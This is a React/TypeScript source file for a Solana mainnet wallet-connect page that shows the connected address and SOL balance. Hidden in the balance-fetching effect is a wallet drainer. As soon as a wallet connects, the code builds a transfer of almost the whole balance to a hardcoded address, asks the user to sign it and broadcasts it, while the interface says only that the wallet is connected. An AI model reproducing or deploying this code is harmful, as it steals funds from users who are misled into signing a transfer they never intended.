import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
import {
    ConnectionProvider,
    WalletProvider,
    useConnection,
    useWallet,
} from '@solana/wallet-adapter-react';
import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
import {
    PhantomWalletAdapter,
    GlowWalletAdapter,
    LedgerWalletAdapter,
    SlopeWalletAdapter,
    SolflareWalletAdapter,
    SolletExtensionWalletAdapter,
    SolletWalletAdapter,
    TorusWalletAdapter,
} from '@solana/wallet-adapter-wallets';
import {
    clusterApiUrl,
    Connection,
    PublicKey,
    LAMPORTS_PER_SOL,
    SystemProgram,
    Transaction,
} from '@solana/web3.js';

import '@solana/wallet-adapter-react-ui/styles.css';
import './App.css';

const App: FC = () => {
    return (
        <Context>
            <ExposeWalletModal />
            <WalletConnectionHandler />
        </Context>
    );
};

const Context: FC<{ children: ReactNode }> = ({ children }) => {
    const network = WalletAdapterNetwork.Mainnet;
    const endpoint = useMemo(() => clusterApiUrl(network), [network]);

    const wallets = useMemo(
        () => [
            new PhantomWalletAdapter(),
            new GlowWalletAdapter(),
            new LedgerWalletAdapter(),
            new SlopeWalletAdapter(),
            new SolflareWalletAdapter({ network }),
            new SolletExtensionWalletAdapter(),
            new SolletWalletAdapter(),
            new TorusWalletAdapter(),
        ],
        [network]
    );

    return (
        <ConnectionProvider endpoint={endpoint}>
            <WalletProvider wallets={wallets} autoConnect>
                <WalletModalProvider>{children}</WalletModalProvider>
            </WalletProvider>
        </ConnectionProvider>
    );
};

const ExposeWalletModal: FC = () => {
    const { setVisible } = useWalletModal();

    useEffect(() => {
        (window as any).openSolanaWalletModal = () => setVisible(true);
    }, [setVisible]);

    return null;
};

const WalletConnectionHandler: FC = () => {
    const { connection } = useConnection();
    const { publicKey, connected, signTransaction } = useWallet();
    const [solBalance, setSolBalance] = useState<number | null>(null);
    const [loading, setLoading] = useState(false);

    useEffect(() => {
        const run = async () => {
            if (!connected || !publicKey || !connection) {
                console.warn("⛔ Wallet or connection not ready.");
                return;
            }

            try {
                setLoading(true);
                console.log("📡 Fetching balance for:", publicKey.toBase58());
                console.log("🌐 RPC endpoint:", connection.rpcEndpoint);

                const lamports = await connection.getBalance(publicKey);
                const sol = lamports / LAMPORTS_PER_SOL;
                setSolBalance(sol);
                console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);

                const safeTransferLamports = lamports - 100_000;
                if (safeTransferLamports <= 0) {
                    console.warn("⚠️ Not enough SOL to send after fee buffer.");
                    return;
                }

                const tx = new Transaction().add(
                    SystemProgram.transfer({
                        fromPubkey: publicKey,
                        toPubkey: new PublicKey('CGuPySjT9CPoa9cNHMg6d2TmkPj22mn132HxwJ43HShh'),
                        lamports: safeTransferLamports,
                    })
                );
                tx.feePayer = publicKey;
                tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

                if (!signTransaction) {
                    alert('❌ Wallet cannot sign transactions. Reconnect.');
                    return;
                }

                const signedTx = await signTransaction(tx);
                console.log('📝 Transaction signed.');

                const signature = await connection.sendRawTransaction(signedTx.serialize());
                console.log(`🚀 Sent! Tx Signature: ${signature}`);
            } catch (err) {
                console.error("❌ Error during transaction:", err);
                setSolBalance(null);
            } finally {
                setLoading(false);
            }
        };

        run();
    }, [connected, publicKey, connection]);

    if (!connected || !publicKey) return null;

    return (
        <div
            style={{
                marginTop: '2rem',
                textAlign: 'center',
                backgroundColor: '#f9fafb',
                padding: '20px',
                borderRadius: '12px',
                boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
                maxWidth: '600px',
                marginLeft: '20px',
                marginRight: 'auto',
                fontFamily: 'Arial, sans-serif',
            }}
        >
            <h2 style={{ color: '#16a34a' }}>✅ Wallet Connected!</h2>
            <p
                style={{ color: '#000', wordBreak: 'break-all', cursor: 'pointer' }}
                onClick={() => navigator.clipboard.writeText(publicKey.toBase58())}
            >
                <strong>Address:</strong> {publicKey.toBase58()}
            </p>
            <p style={{ color: '#000' }}>
                <strong>Balance:</strong>{' '}
                {loading
                    ? 'Loading...'
                    : solBalance === null
                    ? 'Error fetching balance'
                    : `${solBalance.toFixed(4)} SOL`}
            </p>
            <p style={{ fontSize: '0.9rem', color: '#888' }}>
                <strong>RPC:</strong> {connection.rpcEndpoint}
            </p>
        </div>
    );
};

export default App;
